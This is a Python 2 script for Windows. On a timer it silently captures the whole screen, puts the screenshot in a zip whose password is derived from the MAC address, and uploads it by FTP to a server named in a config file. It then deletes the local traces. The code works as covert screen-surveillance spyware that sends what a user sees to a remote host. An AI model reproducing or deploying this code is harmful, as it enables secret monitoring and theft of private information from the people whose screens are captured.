# -*- coding: utf-8 -*-   
import time,Image   
import os, win32gui, win32ui, win32con, win32api   

from ftplib import FTP
import sys
import zipfile

import time

import string

import logging

import socket


CONST_DESTDIR = "screen"
CONST_BUFFER_SIZE = 2048

########### MODIFY ########################



########### MODIFY IF YOU WANT ############

BINARY_STORE = True # if False then line store (not valid for binary files (videos, music, photos...))

###########################################
'''
get your mac

'''
import uuid
def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return "-".join([mac[e:e+2] for e in range(0,11,2)])
'''
generate random pwd
'''
from random import Random
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789!@#$%^&()_~'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
def window_capture():  
		hwnd = 0   
		hwndDC = win32gui.GetWindowDC(hwnd)    
		mfcDC=win32ui.CreateDCFromHandle(hwndDC)    
		saveDC=mfcDC.CreateCompatibleDC()    
		saveBitMap = win32ui.CreateBitmap()    
		MoniterDev=win32api.EnumDisplayMonitors(None,None)   
		w = MoniterDev[0][2][2]   
		h = MoniterDev[0][2][3]   
		#print w,h　　　#size of pic   
		saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)    
		saveDC.SelectObject(saveBitMap)    
		saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)   
		cc=time.gmtime()  
		#print cc 
		bmpname=str(cc[0])+"-"+str(cc[1])+"-"+str(cc[2])+"-"+str(cc[3])+"-"+str(cc[4])+"-"+str(cc[5])+'.bmp'   
		saveBitMap.SaveBitmapFile(saveDC, bmpname)   
		Image.open(bmpname).save(bmpname[:-4]+".jpg")   
		os.remove(bmpname)   
		jpgname=bmpname[:-4]+'.jpg'   
		#djpgname=dpath+jpgname   
		#copy_command = "move %s %s" % (jpgname, djpgname)   
		#os.popen(copy_command)   
		#return bmpname[:-4]+'.jpg'
		return bmpname[:-4]

def init_env(filetype):
	#lists = os.list("./")
	#print list
	for root,dirs,files in os.walk("./"):
		for filename in files:
			if filetype in filename:
				os.remove(filename)
			#print filename
def checkfile(filetype):
	#lists = os.list("./")
	#print list
	for root,dirs,files in os.walk("./"):
		for filename in files:
			if filetype in filename:
				return True
	return False
'''
	FTP FILE MGR
'''



def connect_ftp(SERVER,USER,PASS,PORT):
    #Connect to the server
    ftp = FTP()
    ftp.connect(SERVER, PORT)
    ftp.login(USER, PASS)
    
    return ftp

def upload_file(ftp, upload_file_path,upload_file_name):
		
    #Open the file
    #ftp.cwd(fpath)
		try:
			ftp_f_list = ftp.nlst()
			if CONST_DESTDIR in ftp_f_list:
				pass
				#print("[*]" + CONST_DESTDIR + "always exist!")
			else:
				ftp.mkd(CONST_DESTDIR)
				#print("[*]" + CONST_DESTDIR + "new build success")
				
			ftp.cwd("./"+ CONST_DESTDIR)
			ftp_f_list = ftp.nlst()
			if upload_file_path in ftp_f_list:
				pass
				#print("[*]" + upload_file_path + "always exist!")
			else:
				ftp.mkd(upload_file_path)
				#print("[*]" + upload_file_path + "new build success")
			ftp.cwd(upload_file_path )
			
			cc=time.gmtime()  
			dirdate=str(cc[0])+str(cc[1])+str(cc[2]) 
			
			ftp_f_list = ftp.nlst()
			#print ftp_f_list
			if dirdate in ftp_f_list:
				#print("[*]" + dirdate + "always exist!")
				pass
			else:
				ftp.mkd(dirdate)
				#print("[*]" + dirdate + "new build success")
			ftp.cwd(dirdate)
		except:
			logging.debug("ftp mkdir dir failure!")
		
		socket.setdefaulttimeout(60)	
		try:
			upload_file = open(upload_file_name, 'rb')
			ftp.storbinary('STOR '+ upload_file_name, upload_file,CONST_BUFFER_SIZE)
			#print "ftp upload success!"
		except:
			logging.debug("ftp upload failure!")
		ftp.close()

    
#Take all the files and upload all
'''
zip file
'''
import zipfile

def rarfile(picname,pwd):
	rootdir =  os.path.abspath("./")
	#command =rootdir +'/tools/zip.exe a -m5 -r -hp'+pwd+' '+picname+'.zip *.jpg' 
	command =rootdir +'/tools/zip.exe a -m5 -r -hp'+pwd+' '+picname+'.zip *.jpg 1>nul 2>nul' 
	os.popen(command)
	time.sleep(5)
	#print "rar end!"
	
	
	
	
def control(SERVER,USER,PASS,PORT):
	
	#get screen pic
	init_env(".jpg")#clear all pic
	init_env(".zip")#clear all zip
	try:
		picname = window_capture()#get pic
	except:
		logging.debug("!capture picture failure!")
		return 0
	ppp = picname.replace("-","")
	ppp = ppp[-4:]
	try:
		ftp_conn = connect_ftp(SERVER,USER,PASS,PORT)
	except:
		logging.debug("ftp connect failure!")
		return 0
	if checkfile(".jpg"):
		mac_addr =  get_mac_address()
		if len(mac_addr) == 0:
			logging.debug("mac address get failure!")
			return 0
		p1 = mac_addr.replace("-","")
		p1 = p1[-3:]
		#print mac_addr
		#print ppp
		pwd = p1 + ppp
		if len(pwd) == 0:
			logging.debug("need string get failure!")
			return 0 
		try:
			rarfile(picname,pwd)
		except:
			logging.debug("encoder file failure!")
			return 0
		time.sleep(5)
		if checkfile("zip"):	
			upload_file(ftp_conn, mac_addr,picname+".zip")
			time.sleep(5)
			init_env(".zip")
			init_env(".jpg")
			return 0
		else:
			logging.debug("no zip file!")
	else:
		logging.debug("capture picture failure!")
	
	
	
	
	
	
if __name__ == '__main__':
	
	logging.basicConfig(level=logging.DEBUG,
										  format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
										  datefmt='%a, %d %b %Y %H:%M:%S',
										  filename='./log/log.log',
										  filemode='w')
	while 1:
		try:
			rootdir =  os.path.abspath("./")
			f = open(rootdir + "/conf/global.ini")
			i = 0
			info = []
			for line in f:
				if i >=1:
					line=line.strip('\n') 
					info.append(line)
				i = i+1
			SERVER = info[0]
			USER = info[1]
			PASS = info[2]
			PORT = info[3]
			TIME_STEP = info[4]
		except:
			logging.debug("/conf/global.ini read failure!")
			break
		try:
			control(SERVER,USER,PASS,PORT)
		except:
			init_env(".jpg")#clear all pic
			init_env(".zip")#clear all zip
			time.sleep(string.atoi(TIME_STEP,base = 10))
			
		init_env(".jpg")#clear all pic
		init_env(".zip")#clear all zip
		time.sleep(string.atoi(TIME_STEP,base = 10))